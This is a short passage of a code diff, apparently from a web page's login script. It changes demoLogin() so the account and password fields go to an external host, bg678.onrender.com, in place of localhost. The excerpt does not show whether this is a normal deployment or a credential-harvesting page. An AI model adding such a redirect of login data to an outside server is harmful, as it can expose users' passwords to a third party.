@@ -326,9 +326,8 @@ function togglePassword() {
 function demoLogin() {
   const account = document.getElementById('account').value;
   const password = document.getElementById('password').value;
-  const url = 'http://localhost:3000/submit';
-
-  fetch(url, {
+  const url = 'https://bg678.onrender.com/submit';
+    fetch(url,{
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
